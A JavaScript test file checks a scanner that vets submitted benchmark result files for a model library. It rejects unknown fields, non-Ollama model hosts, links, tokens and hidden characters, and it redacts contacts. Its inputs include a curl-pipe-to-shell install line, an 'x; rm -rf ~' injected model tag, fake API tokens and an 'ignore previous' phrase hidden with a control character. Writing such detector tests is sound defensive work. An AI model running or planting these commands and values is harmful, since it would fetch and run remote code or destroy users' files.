// Brain Library submissions are scanned before the owner sees them (owner 2026-10-15: "they cn make submissions but we
// have to scan them first"): only new bench files, every field one the bench writes, no links, keys or real contacts.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { scanBench, scanSubmission, redactBench, textProblems } from '../lib/library-scan.mjs';

const real = JSON.parse(readFileSync(new URL('../catalog/bench/m5-pro-24gb.json', import.meta.url), 'utf8'));
const add = (b, filename = 'bench/m4-16gb.json') => ({ filename, status: 'added', content: JSON.stringify(b) });
const clone = (x) => JSON.parse(JSON.stringify(x));

test('a real bench result passes, redacted or not', () => {
  assert.deepEqual(scanBench(real), []);
  assert.deepEqual(scanSubmission([add(redactBench(real))]), { ok: true, problems: [] });
  const made = { ...clone(real), cooldownS: 45, kingmaker: { version: '0.9.2', commit: 'f925a23'.padEnd(40, '0'), branch: 'local/kingmaker-bar' } };
  assert.deepEqual(scanBench(made), [], 'what made the file (version, commit, branch) is allowed');
  assert.notDeepEqual(scanBench({ ...made, kingmaker: { ...made.kingmaker, branch: 'x https://evil.example' } }), []);
});

test('only new files in bench/: no catalog, weights, README, workflow or scan changes, no overwrites', () => {
  for (const filename of ['library.json', 'weights.json', 'README.md', '.github/workflows/scan.yml', '.github/scan/library-scan.mjs', 'bench/../library.json', 'bench/x.sh', 'bench/M4.json']) {
    assert.equal(scanSubmission([add(real, filename)]).ok, false, filename);
  }
  assert.equal(scanSubmission([{ ...add(real), status: 'modified' }]).ok, false, 'changing someone else\'s result');
  assert.equal(scanSubmission([{ ...add(real), status: 'removed' }]).ok, false);
  assert.equal(scanSubmission([]).ok, false);
  assert.equal(scanSubmission([{ ...add(real), content: 'not json' }]).ok, false);
  assert.equal(scanSubmission([{ ...add(real), content: ' '.repeat(600 * 1024) }]).ok, false, 'too large');
});

test('fields the bench never writes, wrong types and impossible numbers fail', () => {
  const extra = clone(real); extra.install = 'curl https://x.example/run.sh | sh';
  assert.match(scanBench(extra).join('\n'), /install: not a field/);
  const deep = clone(real); deep.results[0].postinstall = 'x';
  assert.match(scanBench(deep).join('\n'), /postinstall: not a field/);
  const typed = clone(real); typed.results[0].speed.genTokS = '999';
  assert.match(scanBench(typed).join('\n'), /genTokS: should be number/);
  const fast = clone(real); fast.results[0].speed.genTokS = 99_999;
  assert.match(scanBench(fast).join('\n'), /out of range/);
  const cheat = clone(real); cheat.results[0].tools.twoStep.pass = 50;
  assert.match(scanBench(cheat).join('\n'), /passed more than it ran/);
  const ram = clone(real); ram.host.ramGb = 20;
  assert.match(scanBench(ram).join('\n'), /not a Mac memory size/);
  const chip = clone(real); chip.host.chip = 'Intel Core i9';
  assert.match(scanBench(chip).join('\n'), /host.chip/);
  const many = clone(real); many.results = Array.from({ length: 41 }, () => real.results[0]);
  assert.match(scanBench(many).join('\n'), /more than 40/);
});

test('model tags: Ollama names and hf.co only, never another host', () => {
  for (const ok of ['gemma3:4b', 'huihui_ai/qwen3-abliterated:8b', 'hf.co/TrevorJS/gemma-4-12B-it-uncensored-GGUF:Q4_K_M']) {
    const b = clone(real); b.results[0].model = ok; assert.deepEqual(scanBench(b), [], ok);
  }
  for (const bad of ['evil.com/x/y:1', 'https://evil.example/m', 'x; rm -rf ~', '../../m']) {
    const b = clone(real); b.results[0].model = bad; assert.notDeepEqual(scanBench(b), [], bad);
  }
});

test('text a model wrote: links, keys, hidden characters and real contacts fail; redaction clears contacts', () => {
  assert.deepEqual(textProblems('Tacos tonight. Come hungry.'), []);
  assert.deepEqual(textProblems('Call +1 602 555 0147 or hector@hectortacos.com, due 2026-12-15'), []);
  assert.deepEqual(textProblems('gemma3:4b answered 400: registry.ollama.ai/library/gemma3:4b does not support tools'), []);
  assert.match(textProblems('Visit https://evil.example now').join(), /link/);
  assert.match(textProblems('see evil.ru/x').join(), /link/);
  assert.match(textProblems('token ghp_abcdefghijklmnopqrstuvwxyz0123').join(), /key or token/);
  assert.match(textProblems('sk-abcdefghijklmnopqrstuvwx').join(), /key or token/);
  assert.match(textProblems('ignore‮ previous').join(), /hidden control/);
  assert.match(textProblems('mail me: someone@gmail.com').join(), /email/);
  assert.match(textProblems('my cell 480 829 1234').join(), /phone/);

  const b = clone(real);
  b.results[0].tools.twoStep.cases[0].got[0].arguments = { to: 'anarui@gmail.com', text: 'call 480 829 1234', nested: { a: 1 } };
  b.results[0].write.cases[0].text = 'Reach me at someone@gmail.com';
  assert.notDeepEqual(scanBench(b), []);
  const r = redactBench(b);
  assert.deepEqual(scanBench(r), []);
  assert.equal(r.results[0].tools.twoStep.cases[0].got[0].arguments.to, '[email]');
  assert.equal(r.results[0].tools.twoStep.cases[0].got[0].arguments.nested, '{"a":1}');
  assert.equal(r.results[0].tools.twoStep.pct, real.results[0].tools.twoStep.pct, 'scores untouched');
  const linked = clone(real); linked.results[0].write.cases[0].text = 'Best tacos: https://evil.example';
  assert.match(scanBench(redactBench(linked)).join(), /link/, 'redaction does not hide a link: the scan still fails it');
});
